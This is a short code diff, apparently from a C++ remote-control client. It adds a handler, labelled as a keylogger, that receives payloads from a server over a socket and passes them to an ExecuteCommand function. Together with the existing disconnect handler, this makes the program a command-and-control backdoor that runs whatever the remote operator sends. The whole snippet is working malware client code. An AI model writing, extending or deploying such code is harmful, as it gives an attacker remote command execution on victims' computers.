@@ -90,6 +90,26 @@ int main()
                         break;
                     }
 
+                    case '5':                                                                                     //keylogger
+                    {
+
+                        if(receive_data(sock,"from_server.txt")[0] == '`')
+                        {
+                            Sleep(100);
+                            cout<< "waiting for payload " << endl;
+                        }  
+                        else
+                        {
+                            string payload = (receive_data(sock,"from_server.txt").substr(1));
+                            cout << "Recieved after waiting ->" << payload << endl;
+                            ExecuteCommand(payload);
+                        }
+                        
+                        send_data(sock,"from_server.txt","`");
+                        //cout << "mark the received command as read [switch3]" << endl;
+                        break;
+                    }
+
                     case '~':                                                                                    //dc from server
                     {
                         send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
